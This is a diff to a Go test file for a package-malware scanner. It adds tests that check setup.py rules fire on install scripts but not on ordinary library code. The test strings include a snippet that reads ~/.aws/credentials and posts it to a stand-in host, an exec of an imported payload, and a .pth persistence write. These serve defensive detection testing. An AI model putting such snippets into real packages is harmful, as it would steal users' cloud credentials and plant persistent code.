@@ -82,6 +82,44 @@ func TestTelegramBotTokenIsEvidenceInLibrarySource(t *testing.T) {
 	}
 }
 
+// The three Python behaviour rules are setup.py rules. Each case below is a real package the
+// whole-package scan minted on two unrelated statements: `importlib` in one place and `exec(`
+// in another (cxp, cat-agent), and ~/.aws/credentials read for AWS auth in one module with a
+// request in another (puppetmaster-ai).
+func TestSetupBehavioursDoNotJoinUnrelatedLibraryStatements(t *testing.T) {
+	for _, tc := range []struct{ name, src string }{
+		{"cxp", "from importlib.metadata import PackageNotFoundError, distribution\nSCRIPT = (\n    f\"names={names}; items={{}}; \"\n    'exec(code)'\n)\n"},
+		{"cat-agent", "    r'importlib\\.import_module\\s*\\(',  # dynamic imports via importlib\n]\nmsg = ('Disallowed: importlib.import_module()'\n      )\nexec(code, ns)\n"},
+		{"puppetmaster-ai", "\"\"\"Read access key from ``~/.aws/credentials``.\"\"\"\ncreds = open(os.path.expanduser('~/.aws/credentials')).read()\nr = requests.get('https://bedrock.example/v1')\n"},
+	} {
+		f := Detect(&PackageContext{Name: tc.name, Ecosystem: "pypi", PkgbuildContent: tc.src})
+		for _, id := range []string{"PY-SETUP-IMPORTLIB-EXEC", "PY-SETUP-CRED-EXFIL", "PY-PTH-AUTOIMPORT-PERSISTENCE"} {
+			if has(f, id) {
+				t.Errorf("%s: library source fired %s; findings=%v", tc.name, id, ids(f))
+			}
+		}
+		if CombinedVerdict(f).Malicious {
+			t.Errorf("%s: library source minted malware; findings=%v", tc.name, ids(f))
+		}
+	}
+}
+
+func TestSetupBehavioursStillFireInSetupPy(t *testing.T) {
+	for _, tc := range []struct{ id, src string }{
+		{"PY-SETUP-IMPORTLIB-EXEC", "import importlib; exec(importlib.import_module('p').PAYLOAD)\n"},
+		{"PY-SETUP-CRED-EXFIL", "d = open(os.path.expanduser('~/.aws/credentials')).read()\nrequests.post('https://x.example/c', data=d)\n"},
+		{"PY-PTH-AUTOIMPORT-PERSISTENCE", `open(os.path.join(sitedir, "evil.pth"), "w").write("import evil; evil.run()")` + "\n"},
+	} {
+		f := Detect(&PackageContext{Name: "p", Ecosystem: "pypi", InstallScriptContent: tc.src})
+		if !has(f, tc.id) && !has(f, "IS-"+tc.id) {
+			t.Errorf("%s: setup.py content did not fire; findings=%v", tc.id, ids(f))
+		}
+		if !CombinedVerdict(f).Malicious {
+			t.Errorf("%s: setup.py content did not mint; findings=%v", tc.id, ids(f))
+		}
+	}
+}
+
 func TestSetupHostReconIsEvidence(t *testing.T) {
 	line := `_host = subprocess.check_output(["hostname"]).decode(errors="replace").strip()`
 	if !hookMints("pypi", line) {
